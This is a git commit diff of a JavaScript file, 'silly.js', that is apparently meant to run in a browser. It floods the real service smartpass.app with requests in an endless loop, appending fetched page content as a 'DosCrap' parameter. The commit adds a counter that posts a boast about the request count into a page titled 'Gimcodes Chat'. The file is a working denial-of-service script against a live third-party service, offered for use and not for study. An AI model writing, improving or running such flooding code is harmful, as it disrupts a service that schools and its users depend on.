50dcc158311110bc2c1a685d7e4d5af1e90a0f9a
CampBatt <120993447+CampBatt@users.noreply.github.com>
2024-03-04 22:08:41 -0500

    Update silly.js

--- silly.js
+++ silly.js
@@ -2,7 +2,9 @@ async function fetchPasses() {
     await fetch("https://app.smartpass.app/main/passes").then(res =>{
         res.text().then(async textt => {
             console.log(textt)
+            var x = 0
             while (true) {
+                x+=1
                 fetch("https://app.smartpass.app/main/passes" + "?DosCrap=" + textt);
                 fetch("https://www.smartpass.app/" + "?DosCrap=" + textt);
                 fetch("https://app.smartpass.app/main" + "?DosCrap=" + textt);
@@ -11,6 +13,10 @@ async function fetchPasses() {
                 fetch("https://app.smartpass.app/balls2" + "?DosCrap=" + textt);
                 fetch("https://app.smartpass.app/balls3" + "?DosCrap=" + textt);
                 await fetch("https://app.smartpass.app/" + "?DosCrap=" + textt);
+                if (x>150000 && document.title == 'Gimcodes Chat'){
+                    sendMessage('I have sent ' + x + ' requests to smartpass');
+                    x = 0
+                }
                 // Add a delay here before the next fetch
             }
         })
